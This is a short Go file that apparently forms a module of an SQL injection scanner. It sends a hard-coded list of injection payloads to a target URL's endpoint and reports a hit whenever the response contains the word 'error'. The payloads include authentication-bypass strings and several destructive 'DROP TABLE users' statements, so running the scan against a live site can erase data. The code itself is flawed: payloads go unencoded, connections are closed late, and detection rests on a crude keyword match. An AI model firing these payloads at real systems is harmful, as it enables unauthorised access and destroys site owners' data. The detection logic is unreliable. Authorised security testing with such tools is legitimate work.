package modules

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func sqlInject(url string) {
	payloads := []string{
		"' OR '1'='1' --",
		"' OR '1'='1'; --",
		"1; DROP TABLE users; --",
		"1'; DROP TABLE users; --",
		"1'; DROP TABLE users; SELECT * FROM data; --",
	}

	for _, payload := range payloads {
		// Making the URL with the payload
		testURL := fmt.Sprintf("%s/vulnerable-endpoint?param=%s", url, payload)

		response, err := http.Get(testURL) //Sending GET req
		if err != nil {
			fmt.Println("Error sending GET request:", err)
			return
		}
		defer response.Body.Close()

		// Read the response body
		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}

		// Check if the response contains a known vulnerability indicator
		if strings.Contains(string(body), "error") {
			fmt.Printf("Potential SQL injection vulnerability detected with payload: %s\n", payload)
		} else {
			fmt.Printf("No SQL injection vulnerability detected with payload: %s\n", payload)
		}
	}
}
